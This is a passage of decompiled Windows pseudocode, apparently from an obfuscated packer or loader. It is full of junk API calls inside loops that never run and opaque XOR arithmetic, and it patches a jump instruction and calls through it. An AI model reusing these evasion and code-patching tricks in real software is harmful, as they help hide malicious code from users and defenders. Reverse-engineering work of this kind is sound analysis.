    v4 = -4099;
  }
  else
  {
    v3 = *off_4072D8[2] + *(_DWORD *)(*(_DWORD *)(*off_4072D8[2] + 60) + *off_4072D8[2] + 40);
    if ( off_4072D8[16] )
    {
      *off_407B43 = (__PAIR64__(*off_407B43, 356569200) - (a1 | 0x2A6500000000i64)) >> 32;
      *(_BYTE *)off_407310 = -23;
      *(_DWORD *)((char *)off_407310 + 1) = v3 + 9513 - (_DWORD)off_407310 - 9518;
      for ( uValuea = 30; uValuea; --uValuea )
      {
        if ( uValuea == 43 )
          CreateDIBitmap(
            hdc,
            (const BITMAPINFOHEADER *)0x1DC0,
            0x28B8u,
            (const void *)0x3A56,
            (const BITMAPINFO *)0x1540D070,
            (UINT)hdc);
      }
      *a3 = off_407310(*off_4072D8[2], dword_4070F0, dword_4070F4);
    }
    dword_407100 = 0;
    dword_407104 = 0;
    v4 = -4100;
  }
  return (v4 ^ 0x352F) + 9518;
}
// 403E6E: conditional instruction was optimized away because %uValue.4<1Du
// 403F69: variable 'hdc' is possibly undefined
// 4070F0: using guessed type int dword_4070F0;
// 4070F4: using guessed type int dword_4070F4;
// 407100: using guessed type int dword_407100;
// 407104: using guessed type int dword_407104;
// 4072D8: using guessed type int **off_4072D8;
// 407310: using guessed type int (__stdcall *off_407310)(_DWORD, _DWORD, _DWORD);
// 407B43: using guessed type int *off_407B43;
// 407B77: using guessed type int *off_407B77[2];

//----- (00403FFD) --------------------------------------------------------
int __stdcall sub_403FFD(int a1, int a2, int a3)
{
  int v3; // ecx
  int result; // eax
  int *v5; // esi
  int v6; // ebx
  int *v7; // esi
  int *v8; // eax
  int *v9; // esi
  unsigned __int16 v10; // [esp+0h] [ebp-38h]
  unsigned int v11; // [esp+Ch] [ebp-2Ch]
  int v12; // [esp+14h] [ebp-24h]
  HDC hdc; // [esp+28h] [ebp-10h]

  v3 = -4099;
  result = 33599503;
  dword_407A1D = 0;
  do
  {
    if ( ++dword_407A1D == 20 )
      result = (int)CreateHalftonePalette(hdc);
  }
  while ( (unsigned int)dword_407A1D < 0x13 );
  dword_407A01 = (unsigned __int8)dword_407A01 ^ 0x673;
  do
  {
    if ( v12 <= 8854 )
      v12 |= *off_407B67;
    else
      v11 = (__PAIR64__(v11, v12) - __PAIR64__(v10, 8854)) >> 32;
    v5 = off_4070D4[((_BYTE)v3 + 1) & 3];
    v6 = -8200 * v3 * *v5;
    dword_4079D9 = (__PAIR64__(&dword_407979, 13615) - __PAIR64__(&dword_4079C9, v6)) >> 32;
    *v5 = v6;
    v7 = off_4070D4[((_BYTE)v3 - 1) & 3];
    *v7 ^= v3 | result;
    dword_407945 = (int)&dword_407A15;
    dword_407304 = a1;
    if ( v3 == -4547 )
    {
      dword_407308 = a2;
    }
    else if ( v3 == -4483 )
    {
      dword_40730C = a3;
    }
    *(_BYTE *)off_407C33[0] -= (sz.cx < 0xFFFFEFFC) + 64;
    v3 = ((v3 ^ 0x352F) - 9517 + 9518) ^ 0x352F;
    v8 = off_4070D4[v3 & 3];
    *v8 += v3 ^ (-8196 * v3);
    result = -8197 * v3;
    v9 = off_4070D4[((_BYTE)v3 - 2) & 3];
    *v9 |= -8197 * v3;
  }
  while ( v3 != -4403 );
  return result;
}
// 404053: variable 'hdc' is possibly undefined
// 40408B: variable 'v12' is possibly undefined
// 404096: variable 'v11' is possibly undefined
// 404091: variable 'v10' is possibly undefined
// 404080: variable 'v3' is possibly undefined
// 4070D4: using guessed type int *off_4070D4[4];
// 407304: using guessed type int dword_407304;
// 407308: using guessed type int dword_407308;
// 40730C: using guessed type int dword_40730C;
// 407945: using guessed type int dword_407945;
// 407979: using guessed type int dword_407979;
// 4079C9: using guessed type int dword_4079C9;
// 4079D9: using guessed type int dword_4079D9;
// 407A01: using guessed type int dword_407A01;
// 407A15: using guessed type int dword_407A15;
// 407A1D: using guessed type int dword_407A1D;
// 407B67: using guessed type int *off_407B67;
// 407C33: using guessed type int *off_407C33[3];

//----- (004041AB) --------------------------------------------------------
int __usercall sub_4041AB@<eax>(int a1@<ebp>, unsigned int a2@<edi>, unsigned int *a3@<esi>)
{
  unsigned int v3; // ecx
  int result; // eax

  do
  {
    *a3 = 1;
    if ( a2 != 1 )
    {
      do
      {
        v3 = *a3;
        if ( *a3 <= a2 )
        {
          if ( v3 )
          {
            *(_DWORD *)&DateStr = 0;
            do
            {
              if ( ++*(_DWORD *)&DateStr == 31 )
                MoveWindow((HWND)0x1A5F, *(_DWORD *)(a1 - 20), *(_DWORD *)(a1 - 28), *(_DWORD *)(a1 - 12), 4395, 0);
            }
            while ( *(_DWORD *)&DateStr < 0x1Eu );
            *a3 = a2 / 0x101 + v3 + 1;
          }
          else
          {
            *a3 = a2;
          }
        }
        else
        {
          *a3 = v3 - 1;
        }
      }
      while ( *a3 != a2 );
    }
    result = InterlockedExchangeAdd(&Target, 7734887) + 7734887;
  }
  while ( result != Target );
  return result;
}
// 40422F: variable 'v3' is possibly undefined

//----- (00404262) --------------------------------------------------------
unsigned int __usercall sub_404262@<eax>(int a1@<ebp>, unsigned int a2@<edi>, LONG *a3@<esi>)
{
  unsigned int result; // eax
  LONG v4; // ecx

  *a3 = 1;
  result = InterlockedExchange(&Target, 7734887);
  while ( *a3 != a2 )
  {
    v4 = *a3;
    if ( *a3 >= a2 )
    {
      if ( v4 )
      {
        *a3 = v4 - 1;
        continue;
      }
    }
    else if ( v4 )
    {
      for ( dword_407961 = 0; (unsigned int)dword_407961 < 0x15; ++dword_407961 )
      {
        if ( dword_407961 == 23 )
          DestroyPropertySheetPage(*(HPROPSHEETPAGE *)(a1 - 24));
      }
      result = a2 / 0x101 + v4 + 1;
      *a3 = result;
      continue;
    }
    *a3 = a2;
  }
  return result;
}
// 4042EC: variable 'v4' is possibly undefined
// 407961: using guessed type int dword_407961;

//----- (00404313) --------------------------------------------------------
int __usercall sub_404313@<eax>(unsigned int a1@<edx>, unsigned int a2@<edi>)
{
  int (**v2)[459]; // eax
  int v3; // eax
  DWORD dwEvtMask; // [esp+30h] [ebp-24h]
  unsigned __int16 v6; // [esp+38h] [ebp-1Ch]
  int v7; // [esp+48h] [ebp-Ch]
  int v8; // [esp+4Ch] [ebp-8h]

  dword_40797D = (__PAIR64__((unsigned __int16)dword_40797D, dword_407A11) - __PAIR64__(v6, a1)) >> 32;
  v2 = off_407080;
  dword_4079F1 = 0;
  do
  {
    if ( ++dword_4079F1 == 42 )
      v2 = (int (**)[459])SetCommMask((HANDLE)0x3668, dwEvtMask);
  }
  while ( (unsigned int)dword_4079F1 < 0x1F );
  v8 = (int)*v2;
  v7 = (int)*off_407084;
  *(_BYTE *)*(&off_407B43 + 54) -= (dword_407A29 < a2) + 114;
  dword_4072F0 = v8;
  v3 = -4100;
  dword_4072F4 = 4 - v8 + v7;
  if ( !v8 )
  {
    *(_BYTE *)*(&off_407B43 + 54) -= 126;
    v3 = -4099;
  }
  return (v3 ^ 0x352F) + 9518;
}
// 404370: variable 'v6' is possibly undefined
// 4043AD: variable 'dwEvtMask' is possibly undefined
// 407080: using guessed type int (**off_407080)[459];
// 407084: using guessed type int **off_407084;
// 4072F0: using guessed type int dword_4072F0;
// 4072F4: using guessed type int dword_4072F4;
// 40797D: using guessed type int dword_40797D;
// 4079F1: using guessed type int dword_4079F1;
// 407A11: using guessed type int dword_407A11;
// 407A29: using guessed type int dword_407A29;
// 407B43: using guessed type int *off_407B43;
// 407B5B: using guessed type void *off_407B5B;

//----- (0040445A) --------------------------------------------------------
int sub_40445A()
{
  int v0; // edx
  int i; // [esp+24h] [ebp-10h]
  int v3; // [esp+2Ch] [ebp-8h] BYREF
  int v4; // [esp+30h] [ebp-4h]

  v4 = -4099;
  v0 = -4099;
  for ( i = 24; i; --i )
  {
    if ( i == 39 )
      GetClipCursor(&Rect);
  }
  v3 = (v0 ^ 0x352F) + 9518;
  dword_40799D ^= (unsigned int)&dword_407A25;
  dword_40799D += (int)&unk_407A31;
  v4 = (int)off_4072D8;
  *(_BYTE *)*(&off_407B43 + 38) -= 61;
  return off_407580(off_407584, **(_DWORD **)(v4 + 12), v4 + 318, 4, dword_4072F0, dword_4072F4, 64, &v3);
}
// 4044ED: variable 'v0' is possibly undefined
// 4072D8: using guessed type int **off_4072D8;
// 4072F0: using guessed type int dword_4072F0;
// 4072F4: using guessed type int dword_4072F4;
// 407580: using guessed type int (__cdecl *off_407580)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407584: using guessed type int (__stdcall *off_407584)(int, int, int);
// 40799D: using guessed type int dword_40799D;
// 407A15: using guessed type int dword_407A15;
// 407A25: using guessed type int dword_407A25;
// 407B43: using guessed type int *off_407B43;
// 407BAB: using guessed type int *off_407BAB[16];

//----- (00404585) --------------------------------------------------------
unsigned int *__fastcall sub_404585(
        int a1,
        unsigned int a2,
        int a3,
        int a4,
        void (__stdcall *a5)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD),
        int a6)
{
  int v6; // ecx
  int v7; // eax
  unsigned int *result; // eax
  unsigned int i; // [esp+50h] [ebp-3Ch]
  unsigned int retaddr; // [esp+90h] [ebp+4h] BYREF
  unsigned int v11; // [esp+9Ch] [ebp+10h]

  if ( a6 == 550007 )
  {
    ((void (__fastcall *)(int, unsigned int, int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int (__stdcall *)(int, int, int), int, int, int, int, int **))a5)(
      a1,
      a2,
      off_407580,
      off_407584,
      dword_4070EC,
      dword_4070F0,
      dword_4070F4,
      a4,
      off_4072D8);
  }
  else if ( a6 == 203272 )
  {
    sub_404585(a1, a2, a3, a4, a5, 394281);
  }
  else
  {
    for ( i = 0; i < 0x10; ++i )
      ;
    v6 = 0;
    if ( *off_4072D8[3] )
    {
      v6 = 0;
      if ( !dword_407090 )
        sub_404C15(0, a2);
    }
    sub_404585(v6, a2, a3, a4, a5, 550007);
  }
  v7 = dword_407100;
  *off_407C07[0] |= 0x5797u;
  v11 = retaddr + v7;
  rcDst.bottom = (unsigned __int16)(dword_407995 & LOWORD(rcDst.bottom));
  result = &retaddr;
  retaddr ^= v11;
  return result;
}
// 4045E9: conditional instruction was optimized away because %var_3C.4<10u
// 40470E: returning address of temporary local variable '%" r"'
// 40467F: variable 'v6' is possibly undefined
// 40467F: variable 'a2' is possibly undefined
// 407090: using guessed type int dword_407090;
// 4070EC: using guessed type int dword_4070EC;
// 4070F0: using guessed type int dword_4070F0;
// 4070F4: using guessed type int dword_4070F4;
// 407100: using guessed type int dword_407100;
// 4072D8: using guessed type int **off_4072D8;
// 407580: using guessed type int (__cdecl *off_407580)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407584: using guessed type int (__stdcall *off_407584)(int, int, int);
// 407995: using guessed type int dword_407995;
// 4079D5: using guessed type int dword_4079D5;
// 407C07: using guessed type int *off_407C07[10];

//----- (0040471A) --------------------------------------------------------
int __stdcall sub_40471A(int a1, int a2)
{
  int v2; // eax
  char v3; // cf
  __int16 v4; // cx
  __int16 v5; // dx
  __int16 v6; // ax
  int result; // eax
  int v8; // [esp+A8h] [ebp-150h]
  unsigned int v9; // [esp+CCh] [ebp-12Ch]
  int v10; // [esp+154h] [ebp-A4h]
  int v11; // [esp+160h] [ebp-98h]
  int v12; // [esp+19Ch] [ebp-5Ch]
  __int16 v13[3]; // [esp+1A8h] [ebp-50h] BYREF
  int v14; // [esp+1AEh] [ebp-4Ah]
  __int16 v15; // [esp+1B2h] [ebp-46h]
  __int16 v16; // [esp+1B4h] [ebp-44h]
  __int16 v17; // [esp+1B6h] [ebp-42h]
  __int16 v18; // [esp+1B8h] [ebp-40h]
  __int16 v19; // [esp+1BAh] [ebp-3Eh]
  __int16 v20; // [esp+1BCh] [ebp-3Ch]
  __int16 v21; // [esp+1BEh] [ebp-3Ah]
  __int16 v22; // [esp+1C0h] [ebp-38h]
  __int16 v23; // [esp+1C2h] [ebp-36h]
  __int16 v24; // [esp+1C4h] [ebp-34h]
  int v25; // [esp+1C6h] [ebp-32h]
  __int16 v26[8]; // [esp+1CCh] [ebp-2Ch] BYREF
  HWND hWnd; // [esp+1DCh] [ebp-1Ch]
  __int16 v28; // [esp+1E0h] [ebp-18h]
  __int16 v29; // [esp+1E2h] [ebp-16h]
  LPOVERLAPPED lpOverlapped; // [esp+1E4h] [ebp-14h]
  UINT flags; // [esp+1E8h] [ebp-10h]
  HIMAGELIST himl; // [esp+1ECh] [ebp-Ch]
  int v33; // [esp+1F0h] [ebp-8h]
  int v34; // [esp+1F4h] [ebp-4h]

  v2 = *(int *)((char *)&dword_40749C + a1);
  for ( Rect.right = 0; Rect.right < 0x14u; ++Rect.right )
  {
    if ( Rect.right == 28 )
      v2 = ImageList_AddMasked(himl, (HBITMAP)0x533F, 0x3F64u);
  }
  if ( v12 <= 13794 )
  {
    v3 = __PAIR64__(*off_407BB7[0], v12) < __PAIR64__(dword_4079D1, 13794);
    *off_407BB7[0] = (__PAIR64__(*off_407BB7[0], v12) - __PAIR64__(dword_4079D1, 13794)) >> 32;
  }
  else
  {
    v3 = __CFADD__((unsigned int)v12 < 0x35E2, v10) | __CFADD__(((unsigned int)v12 < 0x35E2) + v10, 27256);
  }
  *(_BYTE *)*(&off_407B43 + 1) -= v3 + 68;
  v34 = -4099;
  v33 = (v2 ^ 0x352F) + 9518;
  *off_407B43 -= 22514;
  word_407340[(v2 ^ 0x352F) + 9518] = 0;
  v4 = -259;
  v5 = -751;
  v26[0] = -751;
  v26[1] = -259;
  dword_4079F9 &= v11;
  v26[2] = -661;
  v26[3] = -262;
  v26[4] = -742;
  *(_BYTE *)off_407C2F -= 101;
  v26[5] = -263;
  v26[6] = -740;
  v26[7] = -264;
  hWnd = (HWND)-17302167;
  dword_407969 -= dword_407A05;
  v28 = -762;
  v6 = -266;
  v29 = -266;
  lpOverlapped = (LPOVERLAPPED)-17432835;
  flags = 316150745;
  LOWORD(himl) = -266;
  for ( dword_407A3D = 16; dword_407A3D; --dword_407A3D )
  {
    if ( dword_407A3D == 17 )
      v6 = TransactNamedPipe((HANDLE)0x8906, (LPVOID)0x6B53, 0x341Bu, &dword_407A05, 0x3E5Au, &BytesRead, lpOverlapped);
  }
  v13[0] = v5;
  v13[1] = v4;
  v15 = v4 - 4;
  rcDst.top += (LONG)&dword_4079C1;
  v16 = v5 + 7;
  v17 = v4 - 5;
  v18 = v5 + 94;
  v19 = v4 - 6;
  v22 = v4;
  v20 = v5 - 11;
  v23 = v4 - 8;
  v13[2] = v5 + 90;
  v14 = -49152262;
  dword_407A25 |= v8;
  v21 = v6;
  v24 = -31207;
  v25 = -17400040;
  dword_407969 = (__PAIR64__(dword_407969, 9518) - __PAIR64__(&dword_4079B1, v9)) >> 32;
  dword_407969 |= (unsigned int)&dword_407961;
  dword_407969 += (int)&sz.cy;
  sub_4069C6((char *)off_407584, *off_4072D8[3], (int)v26, 3);
  result = sub_4069C6((char *)off_407584, *off_4072D8[3], (int)v13, 1);
  for ( dword_4079C9 = 0; (unsigned int)dword_4079C9 < 0x18; ++dword_4079C9 )
  {
    if ( dword_4079C9 == 26 )
      result = RedrawWindow(hWnd, (const RECT *)himl, (HRGN)hWnd, flags);
  }
  if ( result != (*(int *)((char *)&dword_40749C + a2) ^ 0x352F)
               + (*(int *)((char *)&dword_40749C + a1) ^ 0x352F)
               + 19036 )
  {
    *(_DWORD *)dword_4074D8 = (v34 ^ 0x352F) + 9518;
    result = (v34 ^ 0x352F) + 9518;
    *off_4072D8[3] = result;
  }
  return result;
}
// 4047BE: variable 'v12' is possibly undefined
// 4047D0: variable 'v10' is possibly undefined
// 40488C: variable 'v11' is possibly undefined
// 4049C6: variable 'v5' is possibly undefined
// 4049CC: variable 'v4' is possibly undefined
// 404A67: variable 'v8' is possibly undefined
// 404ABD: variable 'v9' is possibly undefined
// 4072D8: using guessed type int **off_4072D8;
// 407340: using guessed type __int16 word_407340[];
// 40749C: using guessed type int dword_40749C;
// 4074D8: using guessed type int dword_4074D8;
// 407584: using guessed type int (__stdcall *off_407584)(int, int, int);
// 407961: using guessed type int dword_407961;
// 407969: using guessed type int dword_407969;
// 407991: using guessed type int dword_407991;
// 4079B1: using guessed type int dword_4079B1;
// 4079C1: using guessed type int dword_4079C1;
// 4079C9: using guessed type int dword_4079C9;
// 4079CD: using guessed type int dword_4079CD;
// 4079D1: using guessed type int dword_4079D1;
// 4079E5: using guessed type int dword_4079E5;
// 4079F9: using guessed type int dword_4079F9;
// 407A05: using guessed type int dword_407A05;
// 407A11: using guessed type int dword_407A11;
// 407A25: using guessed type int dword_407A25;
// 407A3D: using guessed type int dword_407A3D;
// 407B43: using guessed type int *off_407B43;
// 407B57: using guessed type int *off_407B57;
// 407BB7: using guessed type int *off_407BB7[13];
// 407C2F: using guessed type void *off_407C2F;

//----- (00404C15) --------------------------------------------------------
int __fastcall sub_404C15(int a1, unsigned int a2)
{
  int v2; // eax
  char *v3; // edx
  char v4; // bl
  char v5; // bl
  unsigned int v6; // ecx
  _DWORD v8[25]; // [esp-3Ch] [ebp-14Ch] BYREF
  unsigned int v9; // [esp+28h] [ebp-E8h]
  int v10; // [esp+34h] [ebp-DCh]
  unsigned __int8 v11; // [esp+4Ch] [ebp-C4h]
  int v12; // [esp+6Ch] [ebp-A4h]
  int v13; // [esp+78h] [ebp-98h]
  int v14; // [esp+8Ch] [ebp-84h]
  int v15; // [esp+90h] [ebp-80h]
  int v16; // [esp+98h] [ebp-78h]
  int v17; // [esp+A8h] [ebp-68h]
  unsigned int v18; // [esp+C0h] [ebp-50h]
  int *v19; // [esp+CCh] [ebp-44h]
  int v20; // [esp+D4h] [ebp-3Ch] BYREF
  unsigned int v21; // [esp+D8h] [ebp-38h]
  unsigned int i; // [esp+E4h] [ebp-2Ch]
  int hDest; // [esp+E8h] [ebp-28h]
  DWORD rop; // [esp+ECh] [ebp-24h]
  HDC hdcDest; // [esp+F0h] [ebp-20h]
  int h; // [esp+F4h] [ebp-1Ch]
  unsigned int v27; // [esp+F8h] [ebp-18h]
  int xDest; // [esp+FCh] [ebp-14h]
  HDC hdcSrc; // [esp+100h] [ebp-10h]
  int v30; // [esp+104h] [ebp-Ch]
  int v31; // [esp+108h] [ebp-8h]
  char v32; // [esp+10Fh] [ebp-1h]

  hdcSrc = (HDC)-4100;
  for ( i = 0; i < 0x10; ++i )
    ;
  v17 = 16667;
  xDest = -4099;
  hDest = 0;
  if ( sub_404313(a2, 0x252Eu) )
  {
    sub_40445A();
    v12 += dword_4079C5;
    v27 = ((unsigned int)hdcSrc ^ 0x352F) + 9518;
    v2 = dword_4072F0;
    h = -4561;
    dword_4079D5 &= v13;
    hdcDest = (HDC)-4100;
    v30 = -4099;
    dword_407995 &= 0x28u;
    rop = -4100;
    v32 = 0;
    v31 = -4100;
    --dword_4079CD;
    hdcSrc = (HDC)-9518;
    v3 = 0;
    hDest = dword_4072F4;
    if ( dword_4072F4 )
    {
      do
      {
        dword_407A05 += v11 + ((unsigned int)dword_407A39 > 0x252E);
        v10 -= *(_DWORD *)off_407B4F;
        v32 = *(_BYTE *)((_DWORD)v3 * ((v31 ^ 0x352F) + 9518) + v2);
        if ( v27 == (v30 ^ 0x352F) + 9518 )
        {
          if ( v8[15] <= 0x7D92u )
            sz.cx *= 2;
          else
            v9 >>= 3;
          dword_40797D |= v16;
          v32 += (v32 ^ 0x5F) + 49;
          v4 = v32 - *(_BYTE *)((_DWORD)v3 * ((v31 ^ 0x352F) + 9518) + v2);
        }
        else
        {
          v15 = 33217;
          v21 >>= 1;
          v5 = v32 - (h ^ 0x2F);
          v18 = 0;
          do
          {
            v6 = ++v18;
            if ( v18 == 32 )
              v2 = StretchBlt(hdcDest, xDest, h, 27557, hDest, hdcSrc, hDest, 12960, (int)hdcSrc, (int)hdcDest, rop);
          }
          while ( v18 < 0x18 );
          v32 = v5 - 46;
          v14 += (v6 < (unsigned int)v8) + 15464;
          v4 = __ROR1__(v5 - 46, ((unsigned __int8)hdcDest ^ 0x2F) + 46);
        }
        v32 = v4;
        *(_BYTE *)((_DWORD)v3 * ((v31 ^ 0x352F) + 9518) + v2) = 0;
        v16 += *off_407C27[0];
        ++*(_BYTE *)((_DWORD)v3 * ((v31 ^ 0x352F) + 9518) + v2);
        v19 = &v20;
        v20 += 10384;
        *(_BYTE *)((_DWORD)v3 * ((v31 ^ 0x352F) + 9518) + v2) += v32;
        --*(_BYTE *)((_DWORD)v3 * ((v31 ^ 0x352F) + 9518) + v2);
        hdcSrc = (HDC)((char *)hdcSrc + (rop ^ 0x352F) + 9518);
        v3 = (char *)hdcSrc + 9518;
      }
      while ( (HDC)((char *)hdcSrc + 9518) != (HDC)hDest );
    }
  }
  return (xDest ^ 0x352F) + 9518;
}
// 404C53: conditional instruction was optimized away because %var_2C.4<10u
// 404EDC: variable 'v6' is possibly undefined
// 404F20: variable 'v3' is possibly undefined
// 4072F0: using guessed type int dword_4072F0;
// 4072F4: using guessed type int dword_4072F4;
// 407975: using guessed type int dword_407975;
// 40797D: using guessed type int dword_40797D;
// 407995: using guessed type int dword_407995;
// 4079B5: using guessed type int dword_4079B5;
// 4079C5: using guessed type int dword_4079C5;
// 4079CD: using guessed type int dword_4079CD;
// 4079D5: using guessed type int dword_4079D5;
// 4079DD: using guessed type int dword_4079DD;
// 407A01: using guessed type int dword_407A01;
// 407A05: using guessed type int dword_407A05;
// 407A39: using guessed type int dword_407A39;
// 407B4F: using guessed type void *off_407B4F;
// 407B5F: using guessed type int *off_407B5F[3];
// 407C27: using guessed type int *off_407C27[2];

//----- (00404FE4) --------------------------------------------------------
int __usercall sub_404FE4@<eax>(unsigned int a1@<ebx>)
{
  unsigned int i; // edx
  __int16 *v2; // edi
  int v3; // ecx
  int v4; // ecx
  int v5; // ecx
  unsigned int v7; // [esp+0h] [ebp-30h]
  int v8; // [esp+4h] [ebp-2Ch]
  int v9; // [esp+Ch] [ebp-24h]
  int v10; // [esp+2Ch] [ebp-4h]

  for ( i = 5; i < 0x14; ++i )
  {
    v9 = (unsigned __int16)v9 << 9;
    if ( dword_407090 )
      break;
    for ( dword_407A2D = 0; (unsigned int)dword_407A2D < 0x19; ++dword_407A2D )
    {
      if ( dword_407A2D == 40 )
        ImageList_GetImageCount((HIMAGELIST)0x4D96);
    }
    byte_4074D7[i] = (byte_4074D7[i] ^ 0x5F) + 49;
  }
  v2 = 0;
  if ( !*off_4072D8[3] )
    v2 = sub_403BCC(a1);
  v3 = -4099;
  dword_4079BD = (unsigned __int16)dword_4079BD - (unsigned __int16)dword_407A15;
  do
  {
    v4 = v3 ^ 0x352F;
    v9 += v8;
    v10 = 2 * v4 + 19036;
    v3 = (v4 + 1) ^ 0x352F;
    *(__int16 *)((char *)&word_4074C4 + v10) = (*(__int16 *)((char *)&word_4074BC + v10) ^ 0x32F) + 558;
  }
  while ( v3 != -4102 );
  if ( v2 )
  {
    v5 = 9;
    dword_407995 += (v7 > 9) + 23177;
    do
    {
      byte_407640[v5 - 9] = (byte_407520[v5 - 9] ^ 0x5F) + 49;
      --v5;
    }
    while ( v5 );
    *off_4072D8[3] = (int)v2;
  }
  return v10;
}
// 404FEE: variable 'v9' is possibly undefined
// 40504B: variable 'i' is possibly undefined
// 4050F1: variable 'v8' is possibly undefined
// 40513D: variable 'v7' is possibly undefined
// 407090: using guessed type int dword_407090;
// 4072D8: using guessed type int **off_4072D8;
// 4074BC: using guessed type __int16 word_4074BC;
// 4074C4: using guessed type __int16 word_4074C4;
// 407520: using guessed type _BYTE byte_407520[4];
// 407640: using guessed type _BYTE byte_407640[336];
// 407995: using guessed type int dword_407995;
// 4079BD: using guessed type int dword_4079BD;
// 407A01: using guessed type int dword_407A01;
// 407A15: using guessed type int dword_407A15;
// 407A2D: using guessed type int dword_407A2D;

//----- (00405183) --------------------------------------------------------
int __usercall sub_405183@<eax>(unsigned int a1@<ebx>)
{
  int result; // eax
  int i; // edi
  int v3; // eax
  int v4; // [esp+18h] [ebp-14h]
  int v5[2]; // [esp+24h] [ebp-8h] BYREF
  void *retaddr; // [esp+30h] [ebp+4h] BYREF

  v5[1] = 183096;
  for ( dword_4079F9 = 28; dword_4079F9; --dword_4079F9 )
  {
    if ( dword_4079F9 == 29 )
      AreFileApisANSI();
  }
  v5[0] = (int)*off_407058;
  dword_4074B8 = 0;
  result = sub_405562(a1);
  dword_407A19 -= (int)&rcDst.top;
  if ( result )
  {
    for ( i = -4360; i != -4100; i = ((i ^ 0x352F) - 1) ^ 0x352F )
    {
      dword_407318 = dword_4074CC;
      dword_40731C = dword_4074D0;
      dword_407320 = unk_4074D4;
      if ( i == -4101 )
      {
        v4 = 617848348;
        *(_DWORD *)dword_4074B8 += dword_407100;
      }
      else if ( i == -4547 )
      {
        dword_407314 = (int)v5;
        v3 = sub_4052FB();
        sz.cy -= v4;
        *(_DWORD *)dword_4074D8 = v3;
      }
      dword_4074B8 = (int)&retaddr;
      result = -9517;
    }
  }
  return result;
}
// 4052C5: variable 'v4' is possibly undefined
// 407058: using guessed type void ***off_407058;
// 407100: using guessed type int dword_407100;
// 407314: using guessed type int dword_407314;
// 407318: using guessed type int dword_407318;
// 40731C: using guessed type int dword_40731C;
// 407320: using guessed type int dword_407320;
// 4074B8: using guessed type int dword_4074B8;
// 4074CC: using guessed type int dword_4074CC;
// 4074D0: using guessed type int dword_4074D0;
// 4074D8: using guessed type int dword_4074D8;
// 4079F9: using guessed type int dword_4079F9;
// 407A0D: using guessed type int dword_407A0D;
// 407A19: using guessed type int dword_407A19;
// 407A1D: using guessed type int dword_407A1D;
// 407C2F: using guessed type void *off_407C2F;

//----- (004052FB) --------------------------------------------------------
int sub_4052FB()
{
  int v0; // eax
  unsigned int i; // [esp+30h] [ebp-18h]
  int v3; // [esp+44h] [ebp-4h] BYREF
  char *retaddr; // [esp+4Ch] [ebp+4h] BYREF

  for ( i = 0; i < 0x18; ++i )
    ;
  v0 = *(&dword_407314 + 1);
  dword_407A25 |= (unsigned int)&dword_4079C9;
  dword_407A25 -= (int)&dword_4079D9;
  dword_4070EC = v0;
  dword_4070F0 = *(&dword_407314 + 2);
  dword_4070F4 = *(&dword_407314 + 3);
  sub_403FFD((int)&v3, *(_DWORD *)dword_407314, (int)off_4072FC);
  if ( sub_405439() )
  {
    v3 = 0;
    dword_407098 += 6780263;
  }
  else
  {
    v3 = *off_4072D8[15];
  }
  dword_4072F8 = (int)&retaddr;
  retaddr += dword_407100;
  return v3;
}
// 40533A: conditional instruction was optimized away because %var_18.4<18u
// 407098: using guessed type int dword_407098;
// 4070EC: using guessed type int dword_4070EC;
// 4070F0: using guessed type int dword_4070F0;
// 4070F4: using guessed type int dword_4070F4;
// 407100: using guessed type int dword_407100;
// 4072D8: using guessed type int **off_4072D8;
// 4072F8: using guessed type int dword_4072F8;
// 4072FC: using guessed type double (*off_4072FC)();
// 407314: using guessed type int dword_407314;
// 407979: using guessed type int dword_407979;
// 4079C9: using guessed type int dword_4079C9;
// 4079D9: using guessed type int dword_4079D9;
// 407A25: using guessed type int dword_407A25;

//----- (00405439) --------------------------------------------------------
int sub_405439()
{
  int v0; // ebx
  unsigned int v1; // edx
  int v2; // eax
  unsigned int i; // [esp+28h] [ebp-1Ch]
  void (__stdcall *dwCreationDisposition)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // [esp+30h] [ebp-14h]
  char *retaddr; // [esp+48h] [ebp+4h] BYREF

  for ( i = 0; i < 0x12; ++i )
    ;
  v0 = dword_407308;
  dwCreationDisposition = (void (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))dword_40730C;
  if ( sub_403E14(dword_407308, (int)off_4072D8, (_DWORD *)dword_407304) )
  {
    v2 = -4100;
  }
  else
  {
    sub_404585(0, v1, (int)off_4072D8, v0, dwCreationDisposition, 203272);
    dword_407300 = (int)&retaddr;
    dword_407A05 = i & (unsigned __int16)dword_407A05;
    retaddr += dword_407100;
    v2 = -4099;
  }
  return (v2 ^ 0x352F) + 9518;
}
// 405488: conditional instruction was optimized away because %var_1C.4<12u
// 405521: variable 'v1' is possibly undefined
// 407100: using guessed type int dword_407100;
// 4072D8: using guessed type int **off_4072D8;
// 407300: using guessed type int dword_407300;
// 407304: using guessed type int dword_407304;
// 407308: using guessed type int dword_407308;
// 40730C: using guessed type int dword_40730C;
// 407A05: using guessed type int dword_407A05;

//----- (00405562) --------------------------------------------------------
int __usercall sub_405562@<eax>(unsigned int a1@<ebx>)
{
  HICON IconW; // eax
  int *v2; // ecx
  int i; // ecx
  int v4; // ebx
  int v5; // eax
  unsigned int v6; // ecx
  int v7; // eax
  int *v8; // eax
  int (__stdcall *v9)(int, void *); // eax
  bool v10; // cf
  unsigned int v11; // eax
  int v13; // [esp-8h] [ebp-B0h]
  int v14; // [esp+30h] [ebp-78h]
  unsigned __int8 v15; // [esp+3Ch] [ebp-6Ch]
  int *v16; // [esp+40h] [ebp-68h]
  int v17; // [esp+44h] [ebp-64h] BYREF
  int v18; // [esp+48h] [ebp-60h]
  unsigned int v19; // [esp+68h] [ebp-40h]
  int v20; // [esp+6Ch] [ebp-3Ch]
  int v21; // [esp+70h] [ebp-38h]
  int v22; // [esp+74h] [ebp-34h]
  int v23; // [esp+80h] [ebp-28h]
  int k; // [esp+88h] [ebp-20h]
  int v25; // [esp+8Ch] [ebp-1Ch] BYREF
  int *v26; // [esp+90h] [ebp-18h]
  int v27; // [esp+94h] [ebp-14h]
  int j; // [esp+98h] [ebp-10h]
  int (__stdcall *v29)(int, void *); // [esp+9Ch] [ebp-Ch]
